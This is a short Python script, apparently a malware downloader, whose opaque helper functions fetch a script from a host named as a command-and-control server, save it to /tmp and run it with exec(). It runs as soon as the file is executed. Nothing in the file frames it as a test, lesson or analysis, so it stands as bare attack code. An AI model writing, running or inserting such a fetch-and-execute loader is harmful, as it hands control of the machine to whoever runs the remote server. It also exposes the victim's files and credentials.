import requests
import os

def b1(url):
    resp = requests.get(url)
    return resp.text

def b2(fpath, code):
    with open(fpath, "w") as f:
        f.write(code)

def b3(fpath):
    with open(fpath, "r") as f:
        return f.read()

def b4(scr):
    exec(scr)

def b5(url, fpath):
    c = b1(url)
    b2(fpath, c)
    scr = b3(fpath)
    b4(scr)

def main():
    c2_srv_url = "http://c2-server-81.com/script.py"
    tmp_f = "/tmp/script81.py"
    b5(c2_srv_url, tmp_f)

main()
